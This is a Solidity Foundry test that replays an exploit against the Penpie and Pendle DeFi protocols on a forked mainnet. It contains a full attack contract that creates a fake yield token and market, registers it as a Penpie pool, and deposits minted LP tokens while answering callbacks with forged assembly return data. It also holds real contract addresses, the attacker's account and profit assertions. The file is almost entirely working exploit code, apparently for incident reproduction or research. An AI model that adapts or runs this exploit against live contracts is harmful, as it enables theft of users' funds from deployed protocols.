
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 20671877;
    uint256 constant TX_TIMESTAMP = 1725388511;
    uint256 constant TX_BLOCK_NUMBER = 20671878;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        PenpiePendleAttack attack = _bindAttackContract();
        _prepareProfit(address(attack), address(0));
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _bindAttackContract() internal returns (PenpiePendleAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchRuntime();
            attack = PenpiePendleAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new PenpiePendleAttack();
        }
    }

    function _etchRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(PenpiePendleAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(
            Addresses.attack_contract,
            attack,
            Addresses.YT_What_26DEC2024,
            "YT-What????-26DEC2024",
            1000000000000000000
        );
        _expectProfit(
            Addresses.attack_contract,
            attack,
            Addresses.PT_What_26DEC2024_PRT,
            "PT-What????-26DEC2024-PRT",
            999999999999999000
        );
    }
}

contract PenpiePendleAttack {
    function attack() external payable {
        _runPendleExploit();
    }

    function _runPendleExploit() internal {
        _createYieldToken();
        _createPendleMarket();
        _registerPenpiePool();
        uint256 principalBalance = _mintPrincipalYield();
        _mintMarketLp(principalBalance);
        _approvePenpieStake();
        uint256 marketLpBalance = IERC20Like(Addresses.PENDLE_LPT).balanceOf(address(this));
        _depositPenpieMarket(marketLpBalance);
    }

    function _createYieldToken() internal {
        IPendleYieldContractFactory(Addresses.PendleYieldContractFactory)
            .createYieldContract(address(this), uint32(1735171200), true);
    }

    function _createPendleMarket() internal {
        IPendleMarketFactoryV3(Addresses.PendleMarketFactoryV3)
            .createNewMarket(
                Addresses.PT_What_26DEC2024,
                int256(23352202321000000000),
                int256(1032480618000000000),
                uint80(1998002662000000)
            );
    }

    function _registerPenpiePool() internal {
        ITransparentUpgradeableProxy_D20C24(Addresses.TransparentUpgradeableProxy_D20C24)
            .registerPenpiePool(Addresses.PENDLE_LPT);
    }

    function _mintPrincipalYield() internal returns (uint256 principalBalance) {
        IYT_What_26DEC2024(Addresses.YT_What_26DEC2024).mintPY(address(this), address(this));
        principalBalance = IERC20Like(Addresses.PT_What_26DEC2024).balanceOf(address(this));
    }

    function _mintMarketLp(uint256 principalBalance) internal {
        IERC20Like(Addresses.PT_What_26DEC2024).transfer(Addresses.PENDLE_LPT, principalBalance);
        IPENDLE_LPT(Addresses.PENDLE_LPT).mint(address(this), principalBalance, 1000000000000000000);
    }

    function _approvePenpieStake() internal {
        IERC20Like(Addresses.PENDLE_LPT)
            .approve(Addresses.TransparentUpgradeableProxy_6E7997, type(uint256).max);
    }

    function _depositPenpieMarket(uint256 marketLpBalance) internal {
        ITransparentUpgradeableProxy_1C1FB3(Addresses.TransparentUpgradeableProxy_1C1FB3)
            .depositMarket(Addresses.PENDLE_LPT, marketLpBalance);
    }

    receive() external payable {}

    function balanceOf(address account) external pure returns (uint256) {
        account;
        return 1000000000000000000;
    }

    function decimals() external pure returns (uint8) {
        return 18;
    }

    function name() external payable {
        bytes memory ret = abi.encode(
            uint256(32),
            uint256(7),
            uint256(39535642524891272141911162302836071328210158575755731348038250140810113712128)
        );
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function exchangeRate() external payable {
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000de0b6b3a7640000";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function symbol() external payable {
        bytes memory ret = abi.encode(
            uint256(32),
            uint256(8),
            uint256(39535642524891272537368571632196959449864892237838715562486643142044288024576)
        );
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function assetInfo() external payable {
        bytes memory ret = abi.encode(uint256(0), 0x4476b6ca46B28182944ED750e74e2Bb1752f87AE, uint256(8));
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function getRewardTokens() external payable {
        bytes memory ret = abi.encode(_uintArray0());
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function claimRewards(address rewardPool) external payable {
        rewardPool;
        bytes memory ret = abi.encode(_uintArray0());
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function rewardIndexesCurrent() external payable {
        bytes memory ret = abi.encode(_uintArray0());
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        if (msg.sig == IERC20Like.balanceOf.selector) {
            bytes memory ret = _balanceRet(hex"0000000000000000000000000000000000000000000000000de0b6b3a7640000");
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (msg.sig == this.attack.selector) {
            _runPendleExploit();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        _unhandledCallback();
    }

    function _unhandledCallback() internal {}

    function _balanceRet(bytes memory replayRet) internal pure returns (bytes memory) {
        return replayRet;
    }

    function _uintArray0() internal pure returns (uint256[] memory out) {
        out = new uint256[](0);
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant YT_What_26DEC2024 = 0x0e3792cBa36EeF3A20aEE3a251D24d7f42491483;
    address internal constant TransparentUpgradeableProxy_162968 = 0x16296859C15289731521F199F0a5f762dF6347d0;
    address internal constant TransparentUpgradeableProxy_1C1FB3 = 0x1C1Fb35334290b5ff1bF7B4c09130885b10Fc0f4;
    address internal constant PTstETHPool25DEC2025_PRT = 0x1c7CE4eA18Eb12b8f8fDeC6CE071F7560ca13e67;
    address internal constant PendleYieldContractFactory = 0x35A338522a435D46f77Be32C70E215B813D0e3aC;
    address internal constant attack_contract = 0x4476b6ca46B28182944ED750e74e2Bb1752f87AE;
    address internal constant ERC1967Proxy = 0x47D74516B33eD5D70ddE7119A40839f6Fcc24e57;
    address internal constant PENDLE_LPT = 0x5b6c23aedf704D19d6D8e921E638e8AE03cDCa82;
    address internal constant TransparentUpgradeableProxy_6E7997 = 0x6E799758CEE75DAe3d84e09D40dc416eCf713652;
    address internal constant PendleMarketFactoryV3 = 0x6fcf753f2C67b83f7B09746Bbc4FA0047b35D050;
    address internal constant attacker_eoa = 0x7A2f4D625Fb21F5e51562cE8Dc2E722e12A61d1B;
    address internal constant PENDLE = 0x808507121B80c02388fAd14726482e061B8da827;
    address internal constant PendleRouterV4 = 0x888888888889758F76e7103c6CbF23ABbF58F946;
    address internal constant Vault_BA1222 = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant PT_What_26DEC2024_PRT = 0xC7a208C3De366df6Ac060033A8Df0a6C9f869772;
    address internal constant TransparentUpgradeableProxy_D20C24 = 0xd20c245e1224fC2E8652a283a8f5cAE1D83b353a;
    address internal constant PT_What_26DEC2024 = 0xE024a18206767e29984a468924e2D318334c9830;
    address internal constant BaseRewardPoolV2 = 0xe2Bd0DCfED1CBe6D7ec0CFffaF5DB2116A48b9C2;
    address internal constant A_F89140_EB1B = 0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IPENDLE_LPT {
    function mint(address, uint256, uint256) external;
    function mint(address to) external returns (uint256 liquidity);
}

interface IPendleMarketFactoryV3 {
    function createNewMarket(address, int256, int256, uint80) external returns (uint256);
}

interface IPendleYieldContractFactory {
    function createYieldContract(address, uint32, bool) external;
}

interface ITransparentUpgradeableProxy_1C1FB3 {
    function depositMarket(address, uint256) external;
}

interface ITransparentUpgradeableProxy_D20C24 {
    function registerPenpiePool(address) external;
}

interface IYT_What_26DEC2024 {
    function mintPY(address, address) external returns (uint256);
}
